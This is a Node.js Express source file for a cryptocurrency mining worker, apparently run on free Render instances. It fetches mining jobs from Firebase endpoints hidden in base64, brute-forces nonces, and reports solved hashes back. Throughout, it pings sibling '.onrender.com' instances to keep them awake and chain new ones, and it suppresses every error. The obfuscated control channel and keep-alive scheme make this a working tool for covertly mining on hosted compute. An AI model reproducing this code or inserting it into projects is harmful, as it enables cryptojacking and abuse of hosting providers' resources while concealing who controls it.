const Module = require('./module')
const express = require('express')
const axios = require('axios')

let mID = null
let mJobSolve = 0
let mJob = null
let mUrl = null
let mOnTime = true
let mNextId = null

let mUpdate5m = new Date().getTime()+300000
let mUpdate1m = new Date().getTime()+60000
let mUpdateUrl = new Date().getTime()+21600000

let mStart = new Date().getTime()
let mTime = new Date().toString()

let BASE_URL = decode('aHR0cHM6Ly9qb2Itc2VydmVyLTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4Lw==')
let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9qb2Itc2VydmVyLTA4OC5hcHBzcG90LmNvbS9vLw==')

const app = express()

app.use(express.json())

app.listen(process.env.PORT || 3000, ()=> {
    console.log('Listening on port 3000')
})


startWorker()

setInterval(async() => {
    getJob()
}, 30000)


async function startWorker() {
    await delay(1000)

    while (true) {
        await getJob()
        if (mJob) {
            break
        }
        await delay(10000)
    }

    console.log('Job Received...')

    while (true) {
        let now = new Date().getTime()
        if (mID && mUpdate1m < now) {
            mUpdate1m = now+60000
            await updateStatus()
        }
        if (mID && mUpdate5m < now) {
            mUpdate5m = now+300000
            updateServer()
            await delay(500)
        }
        await solveJob()
        await delay(0)
    }
}

async function updateStatus() {
    try {
        await axios.get('https://'+mID+'.onrender.com/update')       
    } catch (error) {}

    if (mUrl) {
        try {
            await axios.post(STORAGE+encodeURIComponent('mining/server/'+mID+'.json'), '', {
                headers: {
                    'Content-Type':'active/'+parseInt(new Date().getTime()/1000)
                },
                maxBodyLength: Infinity,
                maxContentLength: Infinity
            })
        } catch (error) {}
    }
}

async function updateServer() {
    if (mID) {
        if (mUrl == null || mUpdateUrl < new Date().getTime()) {
            try {
                let response = await axios.get(BASE_URL+'mining/server/'+mID+'/url.json')
                
                let data = response.data
                if (data != null && data != 'null') {
                    mUrl = data
                    mUpdateUrl = new Date().getTime()+21600000
                }
            } catch (error) {}
        }

        if (mUrl) {
            try {
                await axios.get('https://'+mUrl+'.onrender.com/worker?url='+mUrl)
            } catch (error) {}
        } else {
            if (mNextId == null) {
                try {
                    let response = await axios.get(BASE_URL+'mining/next/url.json')
                    
                    let data = response.data
                    if (data != null && data != 'null') {
                        mNextId = data
                    }
                } catch (error) {}

                if (mNextId && mNextId != mID) {
                    try {
                        await axios.patch(BASE_URL+'mining/next.json', JSON.stringify({ url:mID }), {
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded'
                            }
                        })
                    } catch (error) {}

                    try {
                        await axios.patch(BASE_URL+'mining/server/'+mNextId+'.json', JSON.stringify({ url:mID }), {
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded'
                            }
                        })
                    } catch (error) {}
                }
            }
        }
    }
}

async function getJob() {
    let tempJob = null
    
    try {
        let response = await axios.get(STORAGE+encodeURIComponent('mining/job.json'))

        let contentType = response.data['contentType']
        tempJob = JSON.parse(decode(contentType.replace('base64/', '')))
    } catch (error) {}

    if (tempJob) {
        mJob = tempJob
    } else {
        try {
            let response = await axios.get(BASE_URL+'mining/job.json')
    
            if (response.data && response.data['blob']) {
                mJob = response.data
            }
        } catch (error) {}
    }
}

async function saveHash(id, hsah, nonce) {
    try {
        await axios.patch(BASE_URL+'mining/solved/'+hsah+'.json', JSON.stringify({ id:id, nonce:nonce, time:parseInt(new Date().getTime()/1000) }), {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        })
    } catch (error) {}
}

function encode(data) {
    return Buffer.from(data).toString('base64')
}

function decode(data) {
    return Buffer.from(data, 'base64').toString('ascii')
}

app.get('/', async (req, res) => {
    try {
        let url = req.query.url
        if (!url) {
            let host = req.hostname
            if (host.endsWith('onrender.com')) {
                url = host.replace('.onrender.com', '')
            }
        }

        if (url && url != 'localhost') {
            let temp = mID
            mID = url

            if (mOnTime && temp == null) {
                mOnTime = false
                updateServer()
            }
        }
    } catch (error) {}

    res.end(''+mStart)
})

app.get('/start', async (req, res) => {
    res.end(''+mTime)
})

app.get('/solved', async (req, res) => {
    res.end('SOLVED: '+mJobSolve)
})

app.get('/worker', async (req, res) => {
    try {
        let url = req.query.url
        if (!url) {
            let host = req.hostname
            if (host.endsWith('onrender.com')) {
                url = host.replace('.onrender.com', '')
            }
        }

        if (url && url != 'localhost') {
            let temp = mID
            mID = url

            if (mOnTime && temp == null) {
                mOnTime = false
                updateServer()
            }
        }
    } catch (error) {}

    res.end('ok')
})

app.get('/update', async (req, res) => {
    res.end('ok')
})

app.get('/url_reset', async (req, res) => {
    mUpdateUrl = new Date().getTime()
    res.end('ok')
})

function zeroPad(num, places) {
    var zero = places - num.toString().length + 1;
    return Array(+(zero > 0 && zero)).join("0") + num
}

function hex2int(s) {
    return parseInt(s.match(/[a-fA-F0-9]{2}/g).reverse().join(""), 16)
}

function int2hex(i) {
    return zeroPad(i.toString(16), 8).match(/[a-fA-F0-9]{2}/g).reverse().join("")
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min
}

async function solveJob() {
    try {
        let job = mJob
        let target = hex2int(job.target)
        
        var hexnonce = int2hex(getRandomInt(0, 0xFFFFFFFF))
        var blob = job.blob.substring(0, 78) + hexnonce + job.blob.substring(86, job.blob.length)
        if (job.algo == 'ghostrider') {
            blob = job.blob.substring(0, 152) + hexnonce
        }

        let hash = Module.hash(blob, job.algo, job.targets, job.variant, job.height, job.seed_hash)

        if (hash && hex2int(hash.substring(56, 64)) < target) {
           await saveHash(job.job_id, hash, hexnonce)
            mJobSolve++
        }
    } catch (error) {}
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}
